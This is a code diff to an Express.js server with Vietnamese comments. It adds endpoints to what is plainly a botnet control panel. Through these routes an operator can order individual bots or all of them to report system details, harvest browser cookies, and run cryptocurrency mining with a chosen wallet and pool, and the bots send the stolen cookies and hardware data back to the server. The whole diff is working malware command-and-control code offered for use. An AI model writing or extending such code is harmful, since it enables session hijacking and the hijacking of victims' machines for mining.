@@ -108,6 +108,53 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'panel.html'));
 });
 
+// ===== LẤY THÔNG TIN BOT =====
+app.post('/api/getinfo', (req, res) => {
+    const { botId } = req.body;
+    if (botId === 'ALL') {
+        pendingCommands['ALL'] = { action: 'getinfo' };
+    } else if (botId) {
+        pendingCommands[botId] = { action: 'getinfo' };
+    }
+    res.json({ ok: true });
+});
+
+// ===== LẤY COOKIE =====
+app.post('/api/cookies', (req, res) => {
+    const { botId } = req.body;
+    if (botId === 'ALL') {
+        pendingCommands['ALL'] = { action: 'getcookies' };
+    } else if (botId) {
+        pendingCommands[botId] = { action: 'getcookies' };
+    }
+    res.json({ ok: true });
+});
+
+// ===== ĐÀO COIN =====
+app.post('/api/mining', (req, res) => {
+    const { botId, action, wallet, pool, threads, priority } = req.body;
+    const cmd = { action, wallet, pool, threads, priority };
+    if (botId === 'ALL') {
+        pendingCommands['ALL'] = cmd;
+    } else if (botId) {
+        pendingCommands[botId] = cmd;
+    }
+    res.json({ ok: true });
+});
+
+// ===== BOT BÁO CÁO THÔNG TIN =====
+app.post('/api/reportinfo', (req, res) => {
+    const { id, cpu, ram, gpu, cookies } = req.body;
+    if (bots[id]) {
+        bots[id].cpu = cpu;
+        bots[id].ram = ram;
+        bots[id].gpu = gpu;
+        bots[id].cookies = cookies;
+        bots[id].lastSeen = new Date();
+    }
+    res.json({ ok: true });
+});
+
 // ===== START =====
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
